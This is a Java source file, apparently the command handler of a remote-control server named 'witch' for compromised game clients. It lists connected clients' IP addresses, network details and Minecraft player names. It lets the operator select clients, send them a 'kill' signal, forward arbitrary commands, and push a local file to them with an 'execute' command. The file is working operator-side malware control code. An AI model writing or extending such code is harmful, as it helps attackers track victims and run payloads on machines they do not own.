package me.soda.witch.server.handlers;

import me.soda.witch.server.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class CommandHandler {
    public boolean handle(String in, Server server) {
        boolean stop = false;
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        server.stop();
                        stop = true;
                    }
                    case "conn" -> {
                        if (msgArr.length == 1) {
                            server.log("----CONNECTIONS----");
                            server.getConnections().forEach(conn -> {
                                int index = conn.<Integer>getAttachment();
                                server.log(String.format("IP: %s, ID: %s, Player:%s",
                                        server.clientMap.get(conn).ip.get("ip").getAsString(),
                                        index, server.clientMap.get(conn).playerData.get("playerName").getAsString()));
                            });
                        } else if (msgArr.length == 3) {
                            switch (msgArr[1]) {
                                case "net" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                server.clientMap.get(conn).ip.toString()
                                        )));
                                case "player" -> server.getConnections().stream().filter(conn ->
                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                        .forEach(conn -> server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
                                                server.clientMap.get(conn).playerData.toString()
                                        )));
                                case "sel" -> {
                                    if (msgArr[2].equals("all")) {
                                        server.sendUtil.setAll(true);
                                        server.log("Selected all clients!");
                                        break;
                                    }
                                    List<WebSocket> connCollection = new ArrayList<>();
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(connCollection::add);
                                    server.sendUtil.setConnCollection(connCollection);
                                    server.log("Selected client!");
                                }
                                case "disconnect" -> {
                                    server.getConnections().stream().filter(conn ->
                                                    conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                            .forEach(conn -> conn.send("kill"));
                                    server.log("Client " + msgArr[2] + " disconnected");
                                }
                                default -> {
                                }
                            }
                        }
                    }
                    case "execute" -> {
                        if (msgArr.length < 2) break;
                        String[] strArr = new String[msgArr.length - 1];
                        System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                        File file = new File(String.join(" ", strArr));
                        try (FileInputStream is = new FileInputStream(file)) {
                            server.sendUtil.trySend(server, msgArr[0], is.readAllBytes());
                        }
                    }
                    default -> {
                        if (msgArr.length >= 2) {
                            String[] strArr = new String[msgArr.length - 1];
                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                            server.sendUtil.trySend(server, msgArr[0], String.join(" ", strArr));
                        } else {
                            server.sendUtil.trySend(server, msgArr[0]);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return stop;
    }
}
